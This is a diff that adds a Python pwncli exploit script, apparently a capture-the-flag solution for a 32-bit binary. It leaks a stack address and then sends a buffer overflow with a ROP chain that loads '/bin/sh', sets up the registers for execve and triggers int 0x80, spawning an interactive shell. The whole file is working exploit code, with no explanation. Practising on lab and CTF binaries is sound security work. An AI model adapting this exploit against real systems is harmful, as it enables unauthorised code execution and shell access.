@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+#   expBy : @eastXueLian
+#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
+#   Remote: ./exp.py remote ./pwn ip:port
+
+from pwncli import *
+cli_script()
+#  set_remote_libc('libc.so.6')
+
+io: tube = gift.io
+elf: ELF = gift.elf
+libc: ELF = gift.libc
+
+i2b = lambda c : str(c).encode()
+lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
+debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")
+
+# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
+CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
+
+ru(b'please input what you want say')
+payload = b'a'*4
+s(payload)
+ru(b"aaaa")
+stack_base = u32_ex(rn(4)) - 0x13c
+lg("stack_base")
+
+int_ret = 0x0806fe40
+pop_eax_ret =0x080b8eb6
+pop_ecx_ret = 0x080df8bd
+pop_ebx_ret = 0x080481c9
+
+ru(b'please input what you want say')
+payload = b'/bin/sh\x00'
+payload = payload.ljust(0x68+4, b'a')
+payload += p32(pop_ebx_ret) + p32(stack_base)
+payload += p32(pop_ecx_ret) + p32(0)
+payload += p32(pop_eax_ret) + p32(0xb)
+payload += p32(int_ret)
+s(payload)
+
+ia()
